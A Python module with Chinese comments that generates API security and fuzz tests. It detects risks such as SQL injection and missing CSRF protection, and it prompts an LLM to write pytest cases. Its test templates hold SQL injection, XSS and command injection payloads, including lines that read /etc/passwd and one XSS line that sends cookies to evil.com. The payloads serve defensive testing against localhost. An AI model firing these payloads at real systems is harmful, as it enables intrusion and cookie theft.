"""
安全測試生成器
生成 API 安全測試案例，以檢測常見的 API 安全問題。
"""

import os
import re
import json
import logging
from typing import Dict, List, Optional, Any, Tuple, Union

from llm_integration.llm_client import LLMClient
from llm_integration.prompt_templates import get_template
from utils.file_operations import read_file, write_file
from api_analyzer.endpoint_analyzer import EndpointAnalyzer
from api_analyzer.auth_analyzer import AuthAnalyzer


class SecurityTestGenerator:
    """為 API 端點生成安全測試的工具"""
    
    def __init__(self, project_path: str, output_dir: str = "security_tests", llm_client: Optional[LLMClient] = None):
        """
        初始化安全測試生成器
        
        Args:
            project_path: API 項目的根路徑
            output_dir: 測試輸出目錄
            llm_client: 可選的 LLM 客戶端，用於生成測試
        """
        self.project_path = project_path
        self.output_dir = os.path.join(project_path, output_dir)
        self.llm_client = llm_client
        self.logger = logging.getLogger(__name__)
        
        # 確保輸出目錄存在
        os.makedirs(self.output_dir, exist_ok=True)
        
        # 初始化分析工具
        self.endpoint_analyzer = None
        self.auth_analyzer = None
        
        try:
            self.endpoint_analyzer = EndpointAnalyzer(project_path)
            self.auth_analyzer = AuthAnalyzer(project_path)
        except Exception as e:
            self.logger.warning(f"無法初始化 API 分析工具: {str(e)}")
    
    def generate_security_tests(self, file_path: str) -> Dict[str, Any]:
        """
        為 API 文件生成安全測試
        
        Args:
            file_path: 要為其生成安全測試的 API 文件路徑
            
        Returns:
            包含生成結果的字典
        """
        self.logger.info(f"正在為 {file_path} 生成安全測試")
        
        # 檢查文件是否存在
        if not os.path.exists(file_path):
            self.logger.error(f"文件不存在: {file_path}")
            return {"error": f"文件不存在: {file_path}"}
        
        # 讀取文件內容
        file_content = read_file(file_path)
        if not file_content:
            return {"error": f"無法讀取文件: {file_path}"}
        
        # 分析端點
        endpoints = []
        if self.endpoint_analyzer:
            try:
                endpoints = self.endpoint_analyzer.analyze_endpoints()
            except Exception as e:
                self.logger.warning(f"分析端點時出錯: {str(e)}")
        
        # 分析認證機制
        auth_info = {}
        if self.auth_analyzer:
            try:
                auth_info = self.auth_analyzer.analyze_auth_methods(file_path)
            except Exception as e:
                self.logger.warning(f"分析認證機制時出錯: {str(e)}")
        
        # 確保我們至少檢測到一些端點
        if not endpoints:
            # 嘗試基本端點檢測
            endpoints = self._basic_endpoint_detection(file_content)
        
        # 識別安全風險
        security_risks = self._identify_security_risks(file_path, file_content, endpoints, auth_info)
        
        # 生成安全測試
        security_tests = self._generate_security_test_cases(file_path, file_content, endpoints, auth_info, security_risks)
        
        # 生成 API 模糊測試
        fuzz_tests = self._generate_fuzz_tests(file_path, endpoints)
        
        # 生成 OWASP Top 10 測試
        owasp_tests = self._generate_owasp_tests(file_path, endpoints, auth_info)
        
        # 結合所有測試
        result = {
            "file_path": file_path,
            "detected_endpoints": len(endpoints),
            "security_risks": security_risks,
            "security_tests": security_tests,
            "fuzz_tests": fuzz_tests,
            "owasp_tests": owasp_tests
        }
        
        # 保存生成的測試
        test_file_path = self._save_security_tests(file_path, result)
        result["test_file"] = test_file_path
        
        return result
        
    def generate_security_report(self, file_path: str) -> Dict[str, Any]:
        """
        生成 API 安全報告
        
        Args:
            file_path: 要分析的 API 文件路徑
            
        Returns:
            包含安全評估報告的字典
        """
        self.logger.info(f"正在為 {file_path} 生成安全報告")
        
        # 首先生成安全測試（這將執行分析）
        test_result = self.generate_security_tests(file_path)
        
        # 從測試結果中提取安全風險
        security_risks = test_result.get('security_risks', [])
        
        # 計算風險級別
        risk_levels = {"高": 0, "中": 0, "低": 0}
        for risk in security_risks:
            severity = risk.get('severity', '低')
            risk_levels[severity] = risk_levels.get(severity, 0) + 1
        
        # 生成總體風險評分 (0-10，10 是最高風險)
        risk_score = min(10, (risk_levels["高"] * 3 + risk_levels["中"] * 1.5 + risk_levels["低"] * 0.5) / max(1, len(security_risks)))
        
        # 生成報告摘要
        summary = {
            "file_path": file_path,
            "risk_score": round(risk_score, 1),
            "risk_level": self._get_risk_level(risk_score),
            "risk_counts": risk_levels,
            "endpoint_count": test_result.get('detected_endpoints', 0),
            "vulnerable_endpoints": len([r for r in security_risks if r.get('endpoint', '') != '']),
            "security_risks": security_risks,
        }
        
        # 生成改進建議
        improvements = self._generate_security_improvements(file_path, summary)
        summary["improvement_recommendations"] = improvements
        
        # 保存報告
        report_path = self._save_security_tests(file_path, summary)
        summary["report_file"] = report_path
        
        return summary

    def _basic_endpoint_detection(self, content: str, file_path: str) -> List[Dict[str, Any]]:
        """基本端點檢測，不使用端點分析器"""
        if (file_path.endswith('__init__.py') or 
            '/migrations/' in file_path or
            'settings.py' in file_path or
            'wsgi.py' in file_path or
            'asgi.py' in file_path):
            return []
        endpoints = []
        
        # 檢測 Flask 端點
        flask_pattern = r'@(?:\w+\.)?(?:route|get|post|put|delete|patch)\s*\(\s*[\'"]([^\'"]+)[\'"]'
        for match in re.finditer(flask_pattern, content):
            path = match.group(1)
            # 檢測 HTTP 方法
            method_match = re.search(r'@(?:\w+\.)?(get|post|put|delete|patch)', match.group(0))
            method = method_match.group(1).upper() if method_match else "GET"
            
            # 查找函數名
            func_match = re.search(r'def\s+(\w+)\s*\(', content[match.end():match.end()+200])
            function = func_match.group(1) if func_match else "unknown"
            
            endpoints.append({
                "path": path,
                "method": method,
                "function": function
            })
        
        # 檢測 FastAPI 端點
        fastapi_pattern = r'@(?:\w+\.)?(?:get|post|put|delete|patch)\s*\(\s*[\'"]([^\'"]+)[\'"]'
        for match in re.finditer(fastapi_pattern, content):
            path = match.group(1)
            # 提取 HTTP 方法
            method_match = re.search(r'@(?:\w+\.)?(\w+)', match.group(0))
            method = method_match.group(1).upper() if method_match else "GET"
            
            func_match = re.search(r'def\s+(\w+)\s*\(', content[match.end():match.end()+200])
            function = func_match.group(1) if func_match else "unknown"
            
            endpoints.append({
                "path": path,
                "method": method,
                "function": function
            })
        
        return endpoints

    def _identify_security_risks(self, file_path: str, content: str, 
                                endpoints: List[Dict[str, Any]], 
                                auth_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """識別代碼中的安全風險"""
        risks = []
        
        # 風險 #1：不安全的輸入驗證
        for endpoint in endpoints:
            function = endpoint.get('function', 'unknown')
            path = endpoint.get('path', '')
            
            # 查找函數實現
            func_pattern = rf'def\s+{function}\s*\([^)]*\):'
            func_match = re.search(func_pattern, content)
            if func_match:
                func_content = content[func_match.start():self._find_function_end(content, func_match.start())]
                
                # 檢查輸入驗證
                if not re.search(r'(?:validate|sanitize|clean|check)', func_content, re.IGNORECASE):
                    risks.append({
                        "category": "輸入驗證",
                        "title": "缺少輸入驗證",
                        "description": f"函數 {function} 可能沒有足夠的輸入驗證",
                        "severity": "中",
                        "endpoint": path,
                        "function": function,
                        "mitigation": "實施適當的輸入驗證，包括類型檢查、大小限制和格式驗證。"
                    })
        
        # 風險 #2：SQL 注入
        sql_patterns = [
            r'execute\([\'"](.*?)[\'"]\s*%\s*',
            r'cursor\.execute\([\'"](.*?)[\'"]\s*%\s*',
            r'cursor\.execute\([\'"](.*?)[\'"]\s*\+\s*',
            r'db\.execute\([\'"](.*?)[\'"]\s*%\s*',
            r'db\.execute\([\'"](.*?)[\'"]\s*\+\s*',
            r'raw_sql\s*=',
            r'raw_query\s*='
        ]
        
        for pattern in sql_patterns:
            for match in re.finditer(pattern, content):
                # 尋找所處的函數
                function = self._find_containing_function(content, match.start())
                endpoint = next((e for e in endpoints if e.get('function', '') == function), {})
                
                risks.append({
                    "category": "SQL 注入",
                    "title": "潛在的 SQL 注入漏洞",
                    "description": f"檢測到可能的 SQL 注入風險：不安全的 SQL 查詢構建",
                    "severity": "高",
                    "endpoint": endpoint.get('path', ''),
                    "function": function,
                    "code_snippet": match.group(0),
                    "mitigation": "使用參數化查詢或 ORM，避免直接連接使用者輸入構建 SQL。"
                })
        
        # 風險 #3：認證問題
        auth_risks = []
        
        # 缺少認證
        if not auth_info or not auth_info.get('auth_methods', []):
            auth_risks.append({
                "category": "認證",
                "title": "缺少認證機制",
                "description": "未檢測到明確的認證機制",
                "severity": "高",
                "endpoint": "",
                "mitigation": "實施標準的認證機制，如 JWT、OAuth 或基於會話的認證。"
            })
        
        # 不安全的認證實踐
        auth_methods = auth_info.get('auth_methods', [])
        for method in auth_methods:
            if method.get('type') == 'basic' and not re.search(r'https', content, re.IGNORECASE):
                auth_risks.append({
                    "category": "認證",
                    "title": "不安全的基本認證",
                    "description": "檢測到基本認證，但未在 HTTPS 下使用",
                    "severity": "高",
                    "endpoint": "",
                    "mitigation": "確保所有認證都通過 HTTPS 進行，避免在 HTTP 中使用基本認證。"
                })
            
            if 'hardcoded' in method.get('issues', []):
                auth_risks.append({
                    "category": "認證",
                    "title": "硬編碼的憑證",
                    "description": "檢測到可能的硬編碼憑證",
                    "severity": "高",
                    "endpoint": "",
                    "mitigation": "從代碼中移除所有硬編碼的密碼、令牌和密鑰。使用環境變數或安全的密鑰管理服務。"
                })
        
        risks.extend(auth_risks)
        
        # 風險 #4：CSRF 保護
        if re.search(r'session', content, re.IGNORECASE) and not re.search(r'csrf_token|csrf_protect|@csrf_exempt', content, re.IGNORECASE):
            risks.append({
                "category": "CSRF",
                "title": "缺少 CSRF 保護",
                "description": "使用了會話但未檢測到 CSRF 保護",
                "severity": "中",
                "endpoint": "",
                "mitigation": "為所有改變狀態的操作實施 CSRF 令牌，特別是 POST、PUT 和 DELETE 請求。"
            })
        
        # 如果有 LLM 客戶端，嘗試更深入的分析
        if self.llm_client:
            try:
                additional_risks = self._analyze_security_with_llm(file_path, content, endpoints, auth_info)
                risks.extend(additional_risks)
            except Exception as e:
                self.logger.error(f"LLM安全分析時出錯: {str(e)}")
        
        return risks

    def _find_containing_function(self, content: str, position: int) -> str:
        """找到包含指定位置的函數名稱"""
        # 找到位置之前的所有函數定義
        func_pattern = r'def\s+(\w+)\s*\([^)]*\):'
        functions = list(re.finditer(func_pattern, content[:position]))
        
        if not functions:
            return "unknown"
        
        # 最近的函數定義
        last_func = functions[-1]
        func_name = last_func.group(1)
        func_start = last_func.start()
        
        # 檢查函數範圍是否包含該位置
        func_end = self._find_function_end(content, func_start)
        
        if func_end > position:
            return func_name
        
        return "unknown"

    def _find_function_end(self, content: str, function_start: int) -> int:
        """找到函數定義的結束"""
        lines = content[function_start:].splitlines()
        
        # 尋找第一行，計算縮進
        first_line = lines[0]
        function_indent = len(first_line) - len(first_line.lstrip())
        
        total_length = len(lines[0]) + 1  # +1 為換行符
        
        for i, line in enumerate(lines[1:], 1):
            if line.strip() and len(line) - len(line.lstrip()) <= function_indent:
                # 找到縮進較小或相等的非空行，表示函數結束
                break
            total_length += len(line) + 1  # +1 為換行符
        
        return function_start + total_length

    def _analyze_security_with_llm(self, file_path: str, content: str, 
                                    endpoints: List[Dict[str, Any]], 
                                    auth_info: Dict[str, Any]) -> List[Dict[str, Any]]:
        """使用 LLM 進行安全分析"""
        if not self.llm_client:
            return []
        
        # 獲取安全分析提示模板
        template = get_template('api_security_analysis')
        
        # 如果模板不可用，使用默認提示
        if not template:
            template = """
            對以下 API 代碼進行安全分析，識別潛在的安全風險：
            
            文件路徑: {file_path}
            
            代碼:
            ```python
            {content}
            ```
            
            檢測到的端點:
            {endpoints}
            
            請識別並描述以下類別的潛在安全風險：
            1. 注入攻擊（SQL、NoSQL、命令等）
            2. 認證和授權問題
            3. 敏感數據曝露
            4. XML 外部實體 (XXE)
            5. 訪問控制缺陷
            6. 安全配置錯誤
            7. 跨站腳本 (XSS)
            8. 不安全的反序列化
            9. 使用有漏洞的組件
            10. 日誌記錄和監控不足
            
            對於每個識別的風險，請提供：
            - 風險類別
            - 風險標題
            - 詳細描述
            - 嚴重性（高/中/低）
            - 影響的端點/函數
            - 代碼片段（如果適用）
            - 緩解建議
            
            以 JSON 格式返回結果：
            [
                {{
                "category": "風險類別",
                "title": "風險標題",
                "description": "詳細描述",
                "severity": "嚴重性",
                "endpoint": "影響的端點",
                "function": "影響的函數",
                "code_snippet": "代碼片段（可選）",
                "mitigation": "緩解建議"
                }},
                ...
            ]
            """
        
        # 格式化端點以輸入到提示中
        endpoints_formatted = "\n".join([
            f"- Path: {e.get('path', 'unknown')}, Method: {e.get('method', 'UNKNOWN')}, Function: {e.get('function', 'unknown')}" 
            for e in endpoints
        ])
        
        prompt = template.format(
            file_path=file_path,
            content=content,
            endpoints=endpoints_formatted
        )
        
        # 請求 LLM 分析
        llm_response = self.llm_client.get_completion(prompt)
        
        # 嘗試解析 JSON 響應
        try:
            # 找到 JSON 部分並解析
            json_match = re.search(r'\[\s*{.*}\s*\]', llm_response, re.DOTALL)
            if json_match:
                risks = json.loads(json_match.group(0))
            else:
                # 如果無法找到 JSON 格式，則嘗試解析整個響應
                risks = json.loads(llm_response)
            
            # 確保結果是列表
            if not isinstance(risks, list):
                risks = [risks]
                
            return risks
        except Exception as e:
            self.logger.warning(f"解析 LLM 安全分析響應時出錯: {str(e)}")
            return []

    def _generate_security_test_cases(self, file_path: str, content: str, 
                                    endpoints: List[Dict[str, Any]], 
                                    auth_info: Dict[str, Any],
                                    security_risks: List[Dict[str, Any]]) -> Dict[str, Any]:
        """生成安全測試案例"""
        if self.llm_client:
            try:
                # 獲取安全測試生成提示模板
                template = get_template('api_security_test_generation')
                
                # 如果模板不可用，使用默認提示
                if not template:
                    template = """
                    為以下 API 端點生成安全測試：
                    
                    文件路徑: {file_path}
                    
                    代碼:
                    ```python
                    {content}
                    ```
                    
                    檢測到的端點:
                    {endpoints}
                    
                    檢測到的安全風險:
                    {risks}
                    
                    請生成全面的安全測試案例，使用 Pytest 並結合 requests 庫，包括：
                    1. 必要的導入和設置
                    2. 針對識別的安全風險的測試
                    3. 通用安全測試（即使沒有檢測到特定風險）
                    4. 清晰的測試函數名稱描述測試目的
                    5. 測試預期結果和斷言
                    
                    涵蓋以下安全測試類別：
                    - 認證和會話測試
                    - 授權和權限測試
                    - 輸入驗證測試
                    - 注入測試（SQL、NoSQL、命令等）
                    - 錯誤處理和資訊洩露測試
                    - 業務邏輯漏洞測試
                    
                    Python 代碼：
                    ```python
                    # 完整的測試代碼
                    ```
                    """
                
                # 格式化端點以輸入到提示中
                endpoints_formatted = "\n".join([
                    f"- Path: {e.get('path', 'unknown')}, Method: {e.get('method', 'UNKNOWN') if 'method' in e else e.get('methods', ['UNKNOWN'])[0]}, Function: {e.get('function', 'unknown')}" 
                    for e in endpoints
                ])
                
                # 格式化風險以輸入到提示中
                risks_formatted = "\n".join([
                    f"- {r.get('category', 'unknown')}: {r.get('title', 'unknown')} - {r.get('severity', 'unknown')} severity"
                    for r in security_risks
                ])
                
                prompt = template.format(
                    file_path=file_path,
                    content=content,
                    endpoints=endpoints_formatted,
                    risks=risks_formatted
                )
                
                # 請求 LLM 生成測試
                llm_response = self.llm_client.get_completion(prompt)
                
                # 提取代碼塊
                code_match = re.search(r'```python\s*(.*?)\s*```', llm_response, re.DOTALL)
                if code_match:
                    test_code = code_match.group(1)
                else:
                    test_code = llm_response
                
                # 確保我們有一個有效的 Python 文件
                if not test_code.strip().startswith('import') and not test_code.strip().startswith('from'):
                    test_code = f"# Generated security tests for {os.path.basename(file_path)}\n\n{test_code}"
                
                # 計算為每個端點生成的測試用例數量
                test_cases = {}
                for endpoint in endpoints:
                    function = endpoint.get('function', 'unknown')
                    # 計算有多少個測試用例是為這個函數創建的
                    pattern = rf'def\s+test_\w*{function}\w*\s*\('
                    matches = re.findall(pattern, test_code, re.IGNORECASE)
                    test_cases[function] = len(matches)
                
                return {
                    "test_code": test_code,
                    "test_cases": test_cases,
                    "total_test_cases": sum(test_cases.values())
                }
                
            except Exception as e:
                self.logger.error(f"生成安全測試時出錯: {str(e)}")
                return {
                    "test_code": self._generate_basic_security_tests(file_path, endpoints, security_risks),
                    "error": str(e)
                }
        else:
            return {
                "test_code": self._generate_basic_security_tests(file_path, endpoints, security_risks),
                "test_cases": {}
            }

    def _generate_basic_security_tests(self, file_path: str, 
                                        endpoints: List[Dict[str, Any]], 
                                        security_risks: List[Dict[str, Any]]) -> str:
        """生成基本的安全測試，無需 LLM"""
        base_name = os.path.basename(file_path).replace('.py', '')
        test_code = f"""# Security tests for {base_name}
import pytest
import requests
import json
from unittest.mock import patch, MagicMock

# Define constants and utilities
BASE_URL = "http://localhost:8000/api"
HEADERS = {{"Content-Type": "application/json"}}

# Common payloads for security testing
SQL_INJECTION_PAYLOADS = [
    "' OR '1'='1",
    "'; DROP TABLE users; --",
    "' UNION SELECT * FROM users; --"
]

XSS_PAYLOADS = [
    '<script>alert("XSS")</script>',
    '<img src="x" onerror="alert(\'XSS\')">',
    'javascript:alert("XSS")'
]

COMMAND_INJECTION_PAYLOADS = [
    "os.system('id')",
    "; cat /etc/passwd",
    "` cat /etc/passwd `"
]

"""
        
        # 添加測試工具函數
        test_code += """
def setup_module(module):
    \"\"\"Setup for the test module.\"\"\"
    # Add setup code here
    pass

def teardown_module(module):
    \"\"\"Teardown for the test module.\"\"\"
    # Add teardown code here
    pass

# Test authentication and session handling
@pytest.fixture
def authenticated_client():
    \"\"\"Create an authenticated session.\"\"\"
    session = requests.Session()
    # Add authentication code here
    # Example: session.post(f"{BASE_URL}/login", json={"username": "test", "password": "password"})
    return session

"""
        
        # 為每個端點生成安全測試
        for endpoint in endpoints:
            path = endpoint.get('path', '/unknown')
            method = endpoint.get('method', 'GET') if 'method' in endpoint else endpoint.get('methods', ['GET'])[0]
            function = endpoint.get('function', 'unknown')
            
            # 認證和授權測試
            test_code += f"""
# Authentication and authorization tests for {function}
def test_{function}_authentication(authenticated_client):
    \"\"\"Test authentication requirements for {function}.\"\"\"
    # Unauthenticated request should fail
    unauthenticated_client = requests.Session()
    response = unauthenticated_client.{method.lower()}(f"{{BASE_URL}}{path}")
    assert response.status_code in [401, 403], "Endpoint should require authentication"

    # Authenticated request should succeed
    auth_response = authenticated_client.{method.lower()}(f"{{BASE_URL}}{path}")
    assert auth_response.status_code not in [401, 403], "Authenticated request should be allowed"

"""
            
            # 輸入驗證測試
            if method in ['POST', 'PUT', 'PATCH']:
                test_code += f"""
# Input validation tests for {function}
def test_{function}_input_validation():
    \"\"\"Test input validation for {function}.\"\"\"
    client = requests.Session()

`    # Test with invalid data types
    invalid_data = {{"invalid_field": "invalid_value"}}
    response = client.{method.lower()}(f"{{BASE_URL}}{path}", json=invalid_data)
    assert response.status_code in [400, 422], "Should reject invalid input data"`

    # Test with oversized data
    oversized_data = {{"field": "x" * 10000}}
    response = client.{method.lower()}(f"{{BASE_URL}}{path}", json=oversized_data)
    assert response.status_code in [400, 413], "Should reject oversized input"

"""
            
            # 注入測試
            test_code += f"""
# Injection tests for {function}
def test_{function}_sql_injection():
    \"\"\"Test SQL injection protection for {function}.\"\"\"
    client = requests.Session()

    for payload in SQL_INJECTION_PAYLOADS:
        # Test URL parameters
        response = client.{method.lower()}(f"{{BASE_URL}}{path}?param={{payload}}")
        assert response.status_code != 500, f"SQL injection in URL params: {{payload}}"
        
        # Test request body for POST/PUT/PATCH
        if "{method}" in ["POST", "PUT", "PATCH"]:
            response = client.{method.lower()}(f"{{BASE_URL}}{path}", json={{"field": payload}})
            assert response.status_code != 500, f"SQL injection in request body: {{payload}}"

def test_{function}_xss_protection():
    \"\"\"Test XSS protection for {function}.\"\"\"
    client = requests.Session()

    for payload in XSS_PAYLOADS:
        # Test with XSS payload
        if "{method}" in ["POST", "PUT", "PATCH"]:
            response = client.{method.lower()}(f"{{BASE_URL}}{path}", json={{"field": payload}})
            if response.headers.get("Content-Type") == "application/json":
                assert payload not in response.text, f"XSS payload returned in response: {{payload}}"

"""

            # 根據已識別的風險添加特定測試
            endpoint_risks = [r for r in security_risks if r.get('endpoint', '') == path or r.get('function', '') == function]
            for risk in endpoint_risks:
                category = risk.get('category', '').lower()
                
                if 'csrf' in category:
                    test_code += f"""
def test_{function}_csrf_protection():
    \"\"\"Test CSRF protection for {function}.\"\"\"
    # Setup
    client1 = requests.Session()
    client2 = requests.Session()

    # Login with both clients
    # ... login code ...

    # Make a legitimate request with client1
    # ... request code ...

    # Try to make a CSRF request with client2
    # (This should fail if CSRF protection is properly implemented)
    headers = {{"Referer": "http://malicious-site.com"}}
    response = client2.{method.lower()}(f"{{BASE_URL}}{path}", headers=headers)

    # If the API properly implements CSRF protection, this would fail without a valid CSRF token
    # The exact status code depends on how the application implements CSRF protection
    assert response.status_code in [403, 401, 400], "CSRF protection should prevent this request"

"""
                
                elif 'input' in category:
                    test_code += f"""
def test_{function}_boundary_values():
    \"\"\"Test boundary values for {function}.\"\"\"
    client = requests.Session()

    # Test boundary values
    boundary_tests = [
        {{"field": ""}},  # Empty string
        {{"field": None}},  # None/null
        {{"field": 0}},  # Zero
        {{"field": -1}},  # Negative number
        {{"field": 2147483647}},  # Max int
        {{"field": -2147483648}}  # Min int
    ]

    for test_data in boundary_tests:
        if "{method}" in ["POST", "PUT", "PATCH"]:
            response = client.{method.lower()}(f"{{BASE_URL}}{path}", json=test_data)
            assert response.status_code != 500, f"Boundary test failed with data: {{test_data}}"

"""
                
                elif 'inject' in category:
                    test_code += f"""
def test_{function}_command_injection():
    \"\"\"Test command injection protection for {function}.\"\"\"
    client = requests.Session()

    for payload in COMMAND_INJECTION_PAYLOADS:
        # Test command injection in request parameters
        response = client.{method.lower()}(f"{{BASE_URL}}{path}?param={{payload}}")
        assert response.status_code != 500, f"Command injection in URL: {{payload}}"
        
        # Test in request body
        if "{method}" in ["POST", "PUT", "PATCH"]:
            response = client.{method.lower()}(f"{{BASE_URL}}{path}", json={{"field": payload}})
            assert response.status_code != 500, f"Command injection in body: {{payload}}"

"""
                
                elif 'auth' in category:
                    test_code += f"""
def test_{function}_privilege_escalation():
    \"\"\"Test privilege escalation protection for {function}.\"\"\"
    # Setup low privilege user
    low_priv_client = requests.Session()
    # ... login as low privilege user ...

    # Try to access/modify resources that should require higher privileges
    response = low_priv_client.{method.lower()}(f"{{BASE_URL}}{path}")
    assert response.status_code in [401, 403], "Low privilege user should not access this resource"

"""
        
        # 添加通用安全測試
        test_code += """
# General security tests
def test_security_headers():
    \"\"\"Test security headers in API responses.\"\"\"
    response = requests.get(f"{BASE_URL}/")

    # Check for important security headers
    headers = response.headers

    # Content-Security-Policy
    # assert "Content-Security-Policy" in headers, "Content-Security-Policy header should be present"

    # X-Content-Type-Options
    # assert "X-Content-Type-Options" in headers, "X-Content-Type-Options header should be present"

    # X-Frame-Options
    # assert "X-Frame-Options" in headers, "X-Frame-Options header should be present"

def test_error_information_disclosure():
    \"\"\"Test that errors do not disclose sensitive information.\"\"\"
    # Make a request that would trigger an error
    response = requests.get(f"{BASE_URL}/nonexistent_endpoint")

    # Check that the response does not contain sensitive information
    assert "traceback" not in response.text.lower(), "Error should not include traceback"
    assert "exception" not in response.text.lower(), "Error should not expose exception details"
    assert "stack" not in response.text.lower(), "Error should not expose stack trace"
"""
        
        # 添加 OWASP Top 10 測試提示
        test_code += """
# Note: These tests only cover a subset of security concerns
# For a complete security assessment, consider testing against the OWASP API Security Top 10:
# https://owasp.org/API-Security/editions/2023/en/0x00-header/

# Run with: pytest security_test.py -v
"""
        
        return test_code

    def _generate_fuzz_tests(self, file_path: str, endpoints: List[Dict[str, Any]]) -> Dict[str, Any]:
        """生成 API 模糊測試"""
        if self.llm_client:
            try:
                # 獲取模糊測試生成提示模板
                template = get_template('api_fuzz_test_generation')
                
                # 如果模板不可用，使用默認提示
                if not template:
                    template = """
                    為以下 API 端點生成模糊測試：
                    
                    文件路徑: {file_path}
                    
                    檢測到的端點:
                    {endpoints}
                    
                    請生成使用 Pytest 和適當的模糊測試庫的模糊測試代碼。
                    測試應該集中於發現通過非預期輸入導致的錯誤和安全問題。
                    
                    包括以下內容：
                    1. 必要的導入
                    2. 模糊測試框架設置
                    3. 針對所有端點的模糊測試定義
                    4. 適當的測試數據生成和迭代
                    5. 異常和錯誤處理
                    
                    Python 代碼：
                    ```python
                    # 完整的模糊測試代碼
                    ```
                    """
                
                # 格式化端點以輸入到提示中
                endpoints_formatted = "\n".join([
                    f"- Path: {e.get('path', 'unknown')}, Method: {e.get('method', 'UNKNOWN') if 'method' in e else e.get('methods', ['UNKNOWN'])[0]}, Function: {e.get('function', 'unknown')}" 
                    for e in endpoints
                ])
                
                prompt = template.format(
                    file_path=file_path,
                    endpoints=endpoints_formatted
                )
                
                # 請求 LLM 生成測試
                llm_response = self.llm_client.get_completion(prompt)
                
                # 提取代碼塊
                code_match = re.search(r'```python\s*(.*?)\s*```', llm_response, re.DOTALL)
                if code_match:
                    test_code = code_match.group(1)
                else:
                    test_code = llm_response
                
                # 確保我們有一個有效的 Python 文件
                if not test_code.strip().startswith('import') and not test_code.strip().startswith('from'):
                    test_code = f"# Generated fuzz tests for {os.path.basename(file_path)}\n\n{test_code}"
                
                return {
                    "test_code": test_code
                }
                
            except Exception as e:
                self.logger.error(f"生成模糊測試時出錯: {str(e)}")
                return {
                    "test_code": self._generate_basic_fuzz_tests(file_path, endpoints),
                    "error": str(e)
                }
        else:
            return {
                "test_code": self._generate_basic_fuzz_tests(file_path, endpoints)
            }

    def _generate_basic_fuzz_tests(self, file_path: str, endpoints: List[Dict[str, Any]]) -> str:
        """生成基本的模糊測試，無需 LLM"""
        base_name = os.path.basename(file_path).replace('.py', '')
        test_code = f"""# API Fuzzing tests for {base_name}
import pytest
import requests
import random
import string
import json

# Define the API base URL
BASE_URL = "http://localhost:8000/api"

# Fuzzing data generators
def random_string(length=10):
    \"\"\"Generate a random string of fixed length.\"\"\"
    return ''.join(random.choice(string.ascii_letters) for _ in range(length))

def random_integer(min_val=-1000, max_val=1000):
    \"\"\"Generate a random integer in the specified range.\"\"\"
    return random.randint(min_val, max_val)

def random_float():
    \"\"\"Generate a random float.\"\"\"
    return random.uniform(-1000.0, 1000.0)

def random_boolean():
    \"\"\"Generate a random boolean.\"\"\"
    return random.choice([True, False])

def random_none():
    \"\"\"Return None.\"\"\"
    return None

def random_special_chars(length=10):
    \"\"\"Generate a string with special characters.\"\"\"
    special_chars = "!@#$%^&*()_+-=[]{{}}|;:'\,.<>/?\\\\"
    return ''.join(random.choice(special_chars) for _ in range(length))

def random_sql_injection():
    \"\"\"Generate a random SQL injection payload.\"\"\"
    payloads = [
        "' OR '1'='1", 
        "'; DROP TABLE users; --", 
        "' UNION SELECT * FROM users; --",
        "' OR '1'='1' --",
        "admin'--",
        "1'; SELECT 1,2,3 FROM users WHERE 't'='t",
        "1' OR '1' = '1'))// '",
        "' OR 1=1#",
        "' OR 1=1/*",
        "')) OR 1=1--"
    ]
    return random.choice(payloads)

def random_xss():
    \"\"\"Generate a random XSS payload.\"\"\"
    payloads = [
        "<script>alert('XSS')</script>",
        "<img src="x" onerror="alert(\'XSS\')">",
        "<svg/onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "<script>fetch('https://evil.com?cookie='+document.cookie)</script>"
    ]
    return random.choice(payloads)

# Generate a random payload
def random_payload():
    \"\"\"Generate a random payload for fuzzing.\"\"\"
    generators = [
        random_string,
        random_integer,
        random_float,
        random_boolean,
        random_none,
        random_special_chars,
        random_sql_injection,
        random_xss
    ]
    return random.choice(generators)()

# Generate a random field name
def random_field_name():
    \"\"\"Generate a random field name.\"\"\"
    return random.choice([
        "id", "name", "username", "password", "email", 
        "title", "description", "content", "status", "role",
        "permission", "token", "auth", "user_id", "admin",
        "active", "enabled", "data", "value", "count"
    ])

# Generate a random JSON object
def random_json_object(max_depth=3, current_depth=0):
    \"\"\"Generate a random JSON object for fuzzing.\"\"\"
    if current_depth >= max_depth:
        return random_payload()

    obj_type = random.choice(["dict", "list", "value"])

    if obj_type == "dict":
        obj = {{}}
        for _ in range(random.randint(1, 5)):
            key = random_field_name()
            obj[key] = random_json_object(max_depth, current_depth + 1)
        return obj
    elif obj_type == "list":
        return [random_json_object(max_depth, current_depth + 1) for _ in range(random.randint(1, 5))]
    else:
        return random_payload()

# Fuzz test class
class TestAPIFuzzing:
"""
        
        # 為每個端點生成模糊測試
        for endpoint in endpoints:
            path = endpoint.get('path', '/unknown')
            method = endpoint.get('method', 'GET') if 'method' in endpoint else endpoint.get('methods', ['GET'])[0]
            function = endpoint.get('function', 'unknown')
            
            test_code += f"""
    @pytest.mark.fuzz
    def test_fuzz_{function}_{method.lower()}(self):
        \"\"\"Fuzz test the {function} endpoint ({method} {path}).\"\"\"
        client = requests.Session()
        
        # Generate random path parameters
        path_parts = "{path}".split('/')
        fuzzed_path = []
        
        for part in path_parts:
            if part.startswith('{{') and part.endswith('}}'):
                # This is a path parameter, replace with random data
                fuzzed_path.append(str(random_payload()))
            elif part:
                fuzzed_path.append(part)
        
        fuzzed_endpoint = '/' + '/'.join(fuzzed_path)
        
        # Perform fuzz testing with different payloads
        for _ in range(10):  # Try 10 different random payloads
            try:
                # Generate random query parameters
                params = {{}}
                for _ in range(random.randint(0, 3)):
                    params[random_field_name()] = random_payload()
                
                # Generate random body data for POST/PUT/PATCH
                data = None
                headers = {{"Content-Type": "application/json"}}
                
                if "{method}" in ["POST", "PUT", "PATCH"]:
                    data = random_json_object()
                
                # Make the request
                if "{method}" == "GET":
                    response = client.get(f"{{BASE_URL}}{{fuzzed_endpoint}}", params=params)
                elif "{method}" == "POST":
                    response = client.post(f"{{BASE_URL}}{{fuzzed_endpoint}}", json=data, params=params)
                elif "{method}" == "PUT":
                    response = client.put(f"{{BASE_URL}}{{fuzzed_endpoint}}", json=data, params=params)
                elif "{method}" == "PATCH":
                    response = client.patch(f"{{BASE_URL}}{{fuzzed_endpoint}}", json=data, params=params)
                elif "{method}" == "DELETE":
                    response = client.delete(f"{{BASE_URL}}{{fuzzed_endpoint}}", params=params)
                else:
                    # Unsupported method
                    continue
                
                # Check that the response is not a 500 error (server error)
